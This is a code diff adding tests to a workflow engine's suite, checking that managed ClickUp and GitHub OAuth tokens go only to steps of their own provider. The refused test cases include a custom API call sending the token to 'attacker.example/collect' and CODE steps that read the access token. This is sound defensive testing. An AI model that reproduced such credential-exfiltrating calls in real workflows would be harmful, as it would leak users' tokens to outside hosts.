@@ -9,6 +9,11 @@
 import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { CredentialResolver } from "../credentials/adapter";
 import { JarvisGoogleConnectionSource } from "../credentials/google-source";
+import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
+import { JarvisGitHubConnectionSource } from "../credentials/github-source";
+import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import type { GoogleAuth } from "../../integrations/google-auth";
 import { closeWorkflowDb, DEFAULT_IDS, getWorkflowDb, initWorkflowDb } from "../db";
 import { setEncryptionKey } from "../db/encryption";
@@ -25,6 +30,8 @@ const ACCESS_TOKEN = "synthetic-managed-google-access-token";
 const GMAIL = "@activepieces/piece-gmail";
 const HTTP = "@activepieces/piece-http";
 const SLACK = "@activepieces/piece-slack";
+const CLICKUP = "@activepieces/piece-clickup";
+const GITHUB = "@activepieces/piece-github";
 
 const pieces = new PieceCatalog([
   { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
@@ -43,8 +50,26 @@ const pieces = new PieceCatalog([
       { name: "headers", label: "", type: "json", required: false },
     ] } },
   } },
+  { name: CLICKUP, displayName: "ClickUp", description: "", auth: { type: "OAUTH2" }, actions: {
+    create_task: { name: "create_task", displayName: "", description: "", inputSchema: { fields: [
+      { name: "name", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
   { name: SLACK, displayName: "Slack", description: "", auth: { type: "OAUTH2" }, actions: {
     send_message: { name: "send_message", displayName: "", description: "" },
+  } },
+  { name: GITHUB, displayName: "GitHub", description: "", auth: { type: "OAUTH2" }, actions: {
+    github_create_issue: { name: "github_create_issue", displayName: "", description: "", inputSchema: { fields: [
+      { name: "title", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
   } },
 ] as any);
 
@@ -267,5 +292,103 @@ describe("runtime: the engine's credential route checks the run's own graph", ()
     const runId = triggerHookRunId("poll", flow.id, draft);
     updateDraftVersion(draft.id, { trigger: gmailTrigger() });
     await expectRefused(await fetchFor(runId));
+  });
+});
+
+describe("managed ClickUp is scoped to ClickUp steps", () => {
+  const CLICKUP_TOKEN = "synthetic-managed-clickup-access-token";
+  const ref = "{{connections.jarvis:clickup}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "clickup-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "clickup.json"), JSON.stringify({ version: 1, provider: "clickup", status: "connected",
+      generation: crypto.randomUUID(), access_token: CLICKUP_TOKEN, account: { id: "7", label: "owner" },
+      workspaces: [{ id: "8", name: "Sandbox" }], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisClickUpConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const task = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "create", type: "PIECE", settings: { pieceName: CLICKUP, actionName: "create_task", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const clickUpCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: CLICKUP, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a ClickUp step next to a CODE step that reads the token", empty(task(undefined, code({ token: "{{connections['jarvis:clickup'].access_token}}" })))],
+    ["a ClickUp custom API call to another host", empty(clickUpCall("https://attacker.example/collect"))],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(CLICKUP_TOKEN);
+    });
+  }
+  test("the refusal names ClickUp", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:clickup can only be used by ClickUp steps");
+    expect(issue!.allowedPieces).toEqual([CLICKUP]);
+  });
+  test("a ClickUp step auth, or a custom API call on api.clickup.com, is ready and resolves", async () => {
+    for (const trigger of [empty(task()), empty(clickUpCall("https://api.clickup.com/api/v2/user")), empty(clickUpCall("/user"))]) {
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: CLICKUP, value: { access_token: CLICKUP_TOKEN } });
+    }
+  });
+});
+
+describe("managed GitHub is scoped to GitHub steps", () => {
+  const GITHUB_TOKEN = "synthetic-managed-github-access-token";
+  const ref = "{{connections.jarvis:github}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "github-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "github.json"), JSON.stringify({ version: 1, provider: "github", status: "connected",
+      generation: crypto.randomUUID(), access_token: GITHUB_TOKEN, account: { id: "1", label: "octocat" },
+      workspaces: [], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisGitHubConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const create = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "create", type: "PIECE", settings: { pieceName: GITHUB, actionName: "github_create_issue", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const githubCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: GITHUB, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a GitHub step next to a CODE step that reads the token", empty(create(undefined, code({ token: "{{connections['jarvis:github'].access_token}}" })))],
+    // No host is declared, so even api.github.com is only reachable as a path.
+    ["a GitHub custom API call to a full URL", empty(githubCall("https://api.github.com/user"))],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:github");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(GITHUB_TOKEN);
+    });
+  }
+  test("the refusal names GitHub", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:github can only be used by GitHub steps");
+    expect(issue!.allowedPieces).toEqual([GITHUB]);
+  });
+  // The connection scope only: the managed GitHub action list still refuses a custom API call at dispatch.
+  test("a GitHub step auth, or a custom API call by path, passes the connection scope and resolves", async () => {
+    for (const trigger of [empty(create()), empty(githubCall("/user"))]) {
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:github");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: GITHUB, value: { access_token: GITHUB_TOKEN, jarvis_managed: "github" } });
+    }
   });
 });
